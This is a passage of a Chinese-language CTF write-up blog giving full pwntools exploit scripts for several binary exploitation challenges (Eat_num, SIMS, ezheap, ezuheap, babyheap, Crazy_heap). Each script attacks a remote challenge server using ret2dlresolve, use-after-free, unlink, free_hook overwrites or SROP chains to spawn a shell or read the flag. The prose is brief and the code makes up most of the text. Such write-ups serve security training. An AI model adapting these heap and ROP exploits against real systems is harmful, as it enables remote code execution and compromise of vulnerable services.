payload += p64(pop_rdx)
payload += p64(<span class="hljs-number">0x100</span>)
payload += p64(write_addr)
<span class="hljs-comment">#bug()</span>
p.send(payload)

p.interactive()</code></pre>
<h2 id="Eat-num"><a href="#Eat-num" class="headerlink" title="Eat_num"></a>Eat_num</h2><p>下载附件分析，有溢出漏洞，利用做题模板写脚本，运行得到flag。<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> roputils <span class="hljs-keyword">import</span> *

fpath = <span class="hljs-string">&#x27;./attachment-38&#x27;</span>
offset = <span class="hljs-number">72</span>

rop = ROP(fpath)
addr_bss = rop.section(<span class="hljs-string">&#x27;.bss&#x27;</span>)

buf = rop.retfill(offset)
buf += rop.call(<span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-number">0</span>, addr_bss, <span class="hljs-number">100</span>)
buf += rop.dl_resolve_call(addr_bss+<span class="hljs-number">20</span>, addr_bss)

p = Proc(host=<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,port=<span class="hljs-number">10067</span>)

p.write(p32(<span class="hljs-built_in">len</span>(buf)) + buf)
<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] read: %r&quot;</span> % p.read(<span class="hljs-built_in">len</span>(buf))

buf = rop.string(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)
buf += rop.fill(<span class="hljs-number">20</span>, buf)
buf += rop.dl_resolve_data(addr_bss+<span class="hljs-number">20</span>, <span class="hljs-string">&#x27;system&#x27;</span>)
buf += rop.fill(<span class="hljs-number">100</span>, buf)

p.write(buf)
p.interact(<span class="hljs-number">0</span>)</code></pre>
<h2 id="SIMS"><a href="#SIMS" class="headerlink" title="SIMS"></a>SIMS</h2><p>分析主函数，是一道有UAF的堆漏洞题目，用做题模板写脚本得到flag。<br>exp：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
context.arch=<span class="hljs-string">&quot;amd64&quot;</span>
<span class="hljs-comment">#context.arch=&quot;i386&quot;</span>
context.os=<span class="hljs-string">&quot;linux&quot;</span>
context.log_level=<span class="hljs-string">&quot;debug&quot;</span>
elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
io=<span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> io==<span class="hljs-number">0</span>:
p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
<span class="hljs-keyword">else</span>:
p=remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10085</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():
gdb.attach(p)
pause()
p.sendlineafter(<span class="hljs-string">b&#x27;welcome~ please input the password:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2118602923</span>))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):
p.sendlineafter(<span class="hljs-string">b&#x27;please choose one!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Age of Stu:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
p.sendlineafter(<span class="hljs-string">b&#x27;please choose one!\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,pay</span>):
p.sendlineafter(<span class="hljs-string">b&#x27;please choose one!\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
p.sendlineafter(<span class="hljs-string">b&#x27;Content of Stu:\n&#x27;</span>,pay)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
p.sendlineafter(<span class="hljs-string">b&#x27;please choose one!\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
add(<span class="hljs-number">0x38</span>)
add(<span class="hljs-number">0x450</span>)
add(<span class="hljs-number">0x10</span>)
dele(<span class="hljs-number">1</span>)
show(<span class="hljs-number">1</span>)
libc_base=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x3EBC40</span>
add(<span class="hljs-number">0x450</span>)
heaparray=<span class="hljs-number">0x602160</span>
fd=heaparray-<span class="hljs-number">0x18</span>
bk=heaparray-<span class="hljs-number">0x10</span>
pay=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>)+p64(fd)+p64(bk)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x460</span>)
edit(<span class="hljs-number">0</span>,pay)
dele(<span class="hljs-number">1</span>)
edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))
edit(<span class="hljs-number">0</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))
edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
dele(<span class="hljs-number">2</span>)
success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(libc_base)))
<span class="hljs-comment"># dbg()</span>
p.interactive()</code></pre>
<h2 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h2><p>查看主函数，有堆漏洞<br><img src="https://img-blog.csdnimg.cn/3597b476753e41b6a4411fd8ae2a0cd9.png" alt="在这里插入图片描述"><br>在bk指针处写 个地址,然后再用unsort时会在那个地址上写个堆地址.这样就达到后门条件了，利用后门写exp得到flag<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> base64

<span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):
    p.send(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):
    p.sendafter(a, b)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):
    p.sendline(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):
    p.sendlineafter(a,b)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():
    p.recv()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():
    <span class="hljs-built_in">print</span>(p.recv())
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):
    <span class="hljs-keyword">return</span> p.recvuntil(a)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():
    p.interactive()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():
    gdb.attach(p)
    pause()
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():
    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))
context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
<span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span>
p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>, <span class="hljs-number">10005</span>)
elf = ELF(<span class="hljs-string">&#x27;./pwn35&#x27;</span>)
libc = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)
<span class="hljs-comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):
   sla(<span class="hljs-string">&quot;input your choice : &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
   sla(<span class="hljs-string">&quot;input idx plz : &quot;</span>,<span class="hljs-built_in">str</span>(idx))
   sla(<span class="hljs-string">&quot;input size plz : &quot;</span>,<span class="hljs-built_in">str</span>(size))
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):
   sla(<span class="hljs-string">&quot;input your choice : &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   sla(<span class="hljs-string">&quot;input idx plz : &quot;</span>,<span class="hljs-built_in">str</span>(idx))
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
   sla(<span class="hljs-string">&quot;input your choice : &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
   sla(<span class="hljs-string">&quot;input idx plz : &quot;</span>,<span class="hljs-built_in">str</span>(idx))
   sla(<span class="hljs-string">&quot;input content plz : &quot;</span>,content)
   
add(<span class="hljs-number">0</span>,<span class="hljs-number">0x138</span>)
add(<span class="hljs-number">1</span>,<span class="hljs-number">0x108</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x108</span>)
delete(<span class="hljs-number">0</span>)
addr=<span class="hljs-number">0x6029a8</span>
edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(addr))
add(<span class="hljs-number">0</span>,<span class="hljs-number">0x138</span>)
p.sendline(<span class="hljs-string">b&#x27;5&#x27;</span>)
sleep(<span class="hljs-number">1</span>)
p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x4009aa</span>))
p.interactive()</code></pre>
<h2 id="ezuheap"><a href="#ezuheap" class="headerlink" title="ezuheap"></a>ezuheap</h2><p>题目给出了gift异或得到加载地址,然后show指针前溢出得到stdout的地址<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
<span class="hljs-comment">#io=process(&quot;./uheap&quot;)</span>
io=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10006</span>)
elf=ELF(<span class="hljs-string">&quot;./uheap&quot;</span>)
r = <span class="hljs-keyword">lambda</span> : io.recv()
rx = <span class="hljs-keyword">lambda</span> x: io.recv(x)
ru = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x)
rud = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x, drop=<span class="hljs-literal">True</span>)
uu64= <span class="hljs-keyword">lambda</span> : u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
s = <span class="hljs-keyword">lambda</span> x: io.send(x)
sl = <span class="hljs-keyword">lambda</span> x: io.sendline(x)
sa = <span class="hljs-keyword">lambda</span> x, y: io.sendafter(x, y)
sla = <span class="hljs-keyword">lambda</span> x, y: io.sendlineafter(x, y)
shell = <span class="hljs-keyword">lambda</span> : io.interactive()
<span class="hljs-comment">#libc=elf.libc</span>
libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,length</span>):
   sla(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
   sla(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
   sla(<span class="hljs-string">&quot;len:&quot;</span>,<span class="hljs-built_in">str</span>(length))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):
   sla(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   sla(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
   sla(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
   sla(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
   sl(content)
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
   sla(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
   sla(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
   
<span class="hljs-comment">#gdb.attach(io)</span>
sl(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
pause()
sl(<span class="hljs-string">b&#x27;365303148&#x27;</span>)
ru(<span class="hljs-string">&quot;first gift: 0x&quot;</span>)
first_gift=<span class="hljs-built_in">int</span>(rx(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)
ru(<span class="hljs-string">&quot;second gift: 0x&quot;</span>)
second_gift=<span class="hljs-built_in">int</span>(rx(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)^first_gift
first_gift^=<span class="hljs-number">0x15C6156C</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(first_gift))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(second_gift))
ptr=second_gift-<span class="hljs-number">0x30</span>+<span class="hljs-number">0x8</span>
add(<span class="hljs-number">0</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">1</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">4</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">5</span>,<span class="hljs-number">0x88</span>)
add(<span class="hljs-number">0</span>,<span class="hljs-number">0x88</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):
   delete(<span class="hljs-number">2</span>)
   edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;aaaaaaaaaaaa&#x27;</span>)

delete(<span class="hljs-number">2</span>)
show(<span class="hljs-number">2</span>)
leak_addr=uu64()
main_arena=leak_addr-<span class="hljs-number">96</span>
malloc_hook=main_arena-<span class="hljs-number">0x10</span>
libc_base = malloc_hook - libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))
delete(<span class="hljs-number">5</span>)
edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x110</span>))
edit(<span class="hljs-number">1</span>,(p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)))
delete(<span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ptr))
edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(free_hook))
edit(<span class="hljs-number">1</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))
edit(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))
delete(<span class="hljs-number">5</span>)
shell()</code></pre>
<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>查看主函数有UAF后门，利用这个UAF造重叠块,最后一点点把payload写到free_hook。<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * 
context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;error&#x27;</span>) 
<span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span>
p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>, <span class="hljs-number">10030</span>)
libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>) 
menu = <span class="hljs-string">b&quot;plz input choice: &quot;</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">msg</span>):
    p.sendlineafter(menu, <span class="hljs-string">b&#x27;1&#x27;</span>)
    p.sendafter(<span class="hljs-string">b&quot;plz input content: &quot;</span>, msg)
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
    p.sendlineafter(menu, <span class="hljs-string">b&#x27;2&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&quot;plz input idx: &quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
    p.sendlineafter(menu, <span class="hljs-string">b&#x27;3&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&quot;plz input idx: &quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">free2</span>(<span class="hljs-params">idx</span>):  <span class="hljs-comment"># UAF</span>
    p.sendlineafter(menu, <span class="hljs-string">b&#x27;2023&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&quot;plz input idx: &quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())
 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):
    add(<span class="hljs-string">b&#x27;A&#x27;</span>)
 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>]:
    free(i)
free(<span class="hljs-number">5</span>)
free2(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
heap = u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x190</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;heap = :x&#125;</span>&quot;</span>)
free(<span class="hljs-number">4</span>)
free(<span class="hljs-number">0</span>)
 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>]:
    add(<span class="hljs-string">b&#x27;B&#x27;</span>)
add(p64(heap+<span class="hljs-number">0x50</span>)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0x51</span>))
add(<span class="hljs-string">b&#x27;C&#x27;</span>)
add(<span class="hljs-string">b&#x27;C&#x27;</span>)
add(flat(<span class="hljs-number">0x101</span>, <span class="hljs-number">0x461</span>))
free(<span class="hljs-number">1</span>)
add(<span class="hljs-string">b&#x27;AAA&#x27;</span>)
show(<span class="hljs-number">2</span>)
libc.address = u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;libc.address = :x&#125;</span>&quot;</span>)
free_hook   = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
_environ    = libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]
setcontext  = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]
syscall     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall; ret&quot;</span>)))
pop_rdi     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rdi; ret&quot;</span>)))
pop_rsi     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rsi; ret&quot;</span>)))
pop_rdx_r12 = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rdx; pop r12; ret&quot;</span>)))
pop_rax     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;pop rax; ret&quot;</span>)))
jmp_rsp     = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;jmp rsp&quot;</span>)))
 
<span class="hljs-comment">#gadget</span>
gadget_addr= libc.address + <span class="hljs-number">0x0000000000151990</span>
 
<span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">.text:0000000000151990 48 8B 57 08                   mov     rdx, [rdi+8]</span>
<span class="hljs-string">.text:0000000000151994 48 89 04 24                   mov     [rsp+0C8h+var_C8], rax</span>
<span class="hljs-string">.text:0000000000151998 FF 52 20                      call    qword ptr [rdx+20h]</span>
<span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-comment">#orw</span>
fake_frame_addr = free_hook + <span class="hljs-number">0x10</span>
frame = SigreturnFrame()
frame.rax = <span class="hljs-number">0</span>
frame.rdi = fake_frame_addr + <span class="hljs-number">0xF8</span>
frame.rsp = fake_frame_addr + <span class="hljs-number">0xF8</span> + <span class="hljs-number">0x10</span>
frame.rip = pop_rdi + <span class="hljs-number">1</span>  <span class="hljs-comment"># : ret</span>
 
rop_data = [
    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],
    pop_rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,pop_rdi,<span class="hljs-number">3</span>,pop_rsi,fake_frame_addr + <span class="hljs-number">0x200</span>,libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],
    pop_rdi,fake_frame_addr + <span class="hljs-number">0x200</span>,libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]
    ]
 
frame_data = flat(frame).ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
payload = flat(gadget_addr,fake_frame_addr,frame_data[:<span class="hljs-number">0x20</span>],setcontext+<span class="hljs-number">61</span>,frame_data[<span class="hljs-number">0x28</span>:],<span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>),<span class="hljs-number">0</span>)+flat(rop_data)
 
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;len(payload)&#x27;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload[<span class="hljs-number">0xf8</span>:])))
<span class="hljs-comment">#save payload to __free_hook</span>
offset  = <span class="hljs-number">0</span>
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
free(<span class="hljs-number">13</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">12</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">11</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">10</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">9</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook + offset, heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[offset: offset+<span class="hljs-number">0x40</span>])
 
offset += <span class="hljs-number">0x40</span>
free(<span class="hljs-number">8</span>)
free(<span class="hljs-number">7</span>)
free(<span class="hljs-number">1</span>)
add(flat(<span class="hljs-number">0</span>,<span class="hljs-number">0x51</span>, free_hook , heap-<span class="hljs-number">0xa50</span>))
add(<span class="hljs-string">b&#x27;A&#x27;</span>)
add(payload[<span class="hljs-number">0</span>: <span class="hljs-number">0x40</span>])  
 
free(<span class="hljs-number">8</span>)
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
 
p.recvline()
p.recvline()
p.recvline()
p.interactive()</code></pre>
<h2 id="Crazy-heap"><a href="#Crazy-heap" class="headerlink" title="Crazy_heap"></a>Crazy_heap</h2><p>下载题目附件，查看主函数，有堆相关的漏洞，利用模板写解题脚本。<br>exp如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.arch=<span class="hljs-string">&quot;amd64&quot;</span>
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
p=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10032</span>)
elf=ELF(<span class="hljs-string">&quot;./my_heap&quot;</span>)
libc=ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a,b</span>):
   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;length:&quot;</span>,<span class="hljs-built_in">str</span>(a))
   p.sendlineafter(<span class="hljs-string">&quot;name:&quot;</span>,b)
   p.sendlineafter(<span class="hljs-string">&quot;girl\n&quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit1</span>(<span class="hljs-params">a,b</span>):
   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(a))
   p.sendlineafter(<span class="hljs-string">&quot;(by rename T_T)\n&quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;name:&quot;</span>,b)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit2</span>(<span class="hljs-params">a,b</span>):
   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(a))
   p.sendlineafter(<span class="hljs-string">&quot;(by rename T_T)\n&quot;</span>,<span class="hljs-string">b&quot;0&quot;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;sex:&quot;</span>,<span class="hljs-built_in">str</span>(b))

   
